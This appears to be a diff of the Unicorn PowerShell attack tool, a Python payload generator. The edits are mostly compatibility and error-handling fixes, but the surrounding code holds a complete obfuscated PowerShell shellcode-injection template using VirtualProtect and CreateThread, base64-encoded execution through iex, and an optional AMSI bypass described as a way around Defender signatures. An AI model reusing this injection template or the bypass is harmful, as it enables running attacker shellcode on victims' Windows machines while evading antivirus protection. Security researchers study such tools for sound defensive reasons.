@@ -34,7 +34,8 @@ import binascii
 from functools import reduce
 
 # python 3 compat
-raw_input = input
+try: input = raw_input
+except NameError: pass
 
 #######################################################################################################
 # Keep Matt Happy #####################################################################################
@@ -957,7 +958,8 @@ def gen_shellcode_attack(payload, ipaddr, port):
     powershell_code = (r'''$1111='$tttt=''[$dllimport(("%s"))]public static extern IntPtr $allocreplace(uint dwSize, uint amount);[$dllimport("%s")]public static extern IntPtr $createthreadreplace(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[$dllimport("%s")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[$dllimport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$tttt=$tttt.replace("$createthreadreplace", "%s");$tttt=$tttt.replace("$allocreplace", "%s");$tttt=$tttt.replace("$dllimport", "%s");$zzzz="%s";$wwww=Add-Type -pass -m $tttt -Name "%s" -names $Win32;$wwww=$wwww.replace("$Win32", "%s");[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","$randomized_byte_namex").replace("$randomized_byte_name", "0").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, 0x$randstack, 0x40, [Ref]$tempvar);$wwww::CreateThread(0,0x00,$xxxx,0,0,0);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";$5555 = "C:\$4444\syswow64\$4444$2222\v1.0\$2222";$$truevalue = '%s';if([environment]::Is64BitOperatingSystem -eq '$$truevalue'){$2222= $5555};$fullcommand=" $2222 $noexit $hhhh";$fullcommand=$fullcommand.replace("$noexit", "-noexit -e");iex $fullcommand''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,create_thread,virtual_alloc,DllImport,shellcode,randomize_service_name,Win32,true_mangle)).replace("SHELLCODE_STUB", mangle_shellcode)
 
     # if we want to use AMSI bypassing, currently snagged by defender based on signature updates - easy to get around if you mangle
-    if AMSI_BYPASS.lower() == "on": powershell_code = bypass_amsi() + ";" + powershell_code
+    if AMSI_BYPASS.lower() == "on": 
+        powershell_code = bypass_amsi() + ";" + powershell_code
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
@@ -1119,7 +1121,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
                     print("[*] If you are calling PowerShell directly, this is not a concern.")
                 print("[!] WARNING. WARNING. Length of the payload is above command line limit length of 8191. Recommend trying to generate again or the line will be cut off.")
                 print("[!] Total Payload Length Size: " + str(len(full_attack)))
-                raw_input("Press {return} to continue.")
+                input("Press {return} to continue.")
 
             # format for dde specific payload
             if attack_modifier == "dde":
@@ -1353,6 +1355,6 @@ except KeyboardInterrupt:
     print("\nExiting Unicorn... May the magical unicorn force flow through you.\n")
     sys.exit()
 
-#except Exception as e:
-#    if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
-#    else: print("[!] Something went wrong, printing the error: " + str(e))
+except Exception as e:
+    if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
+    else: print("[!] Something went wrong, printing the error: " + str(e))
